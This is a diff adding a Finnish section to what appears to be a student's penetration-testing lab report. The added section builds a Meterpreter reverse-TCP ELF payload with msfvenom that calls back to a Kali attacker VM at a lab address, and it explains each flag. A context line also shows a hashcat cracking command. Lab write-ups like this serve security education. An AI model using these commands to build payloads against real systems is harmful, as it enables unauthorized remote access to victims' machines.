@@ -165,6 +165,34 @@ Ajetaan komento: `hashcat -m 1400 '05926fd3e6ec8c13c5da5205b546037bdcf861528e0bd
 
 ![image](https://github.com/user-attachments/assets/8f88eb78-fd0a-45ef-a81a-20941de40e5d)
 
+## Haittaohjelma
+
+Aluksi piti varmistaa, että minulla on kaksi laitetta jotka saavat yhteyden toisiinsa. Hyökkääjäkoneena käytän Kali Linuxia ja uhrina käytän Debian Linuxia, jotka ovat samassa Host-only Adapter verkossa. 
+
+![image](https://github.com/user-attachments/assets/f062348f-dffe-4a3b-901b-4b8b3a160c90)
+
+Hyökkääjäkoneen ip: `192.168.56.102`
+Uhrikoneen ip: `192.168.56.103`
+
+Luodaan haittaohjelma kommennolla `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf > shell.elf`
+
+- `-p linux/x86/meterpreter/reverse_tcp` - Käytettävän haittaohjelman tyyppi (payload)
+  - `linux/x86` - Kohteen käyttöjärjestelmä
+  - `meterpreter` - Metasploitin tarjoama hyökkäysympäristö
+  - `reverse_tcp` - payload pyrkii muodostamaan yhteyden hyökkääjään, koska palomuuri sallii yhteydet ulos
+- `LHOST` - Kali VM osoite
+- `LPORT` - Portti jota kuunnellaan
+- `-f elf` - Tiedostomuoto (.elf linux / .exe windows)
+- `> shell.elf` - Haittaohjelma tallennetaan tiedostoon `shell.elf`
+
+![image](https://github.com/user-attachments/assets/628d474a-3372-4c6c-a5ad-4142bd48f411)
+
+![image](https://github.com/user-attachments/assets/2b973648-1182-49ca-9a16-006f0da17169)
+
+![image](https://github.com/user-attachments/assets/f1dc1c15-0195-4d31-a476-5f022627d912)
+
+
+
 ## Lähteet
 
 Karvinen Tero, Tunkeutumistestaus, luettavissa https://terokarvinen.com/tunkeutumistestaus/, luettu 21.4.2025
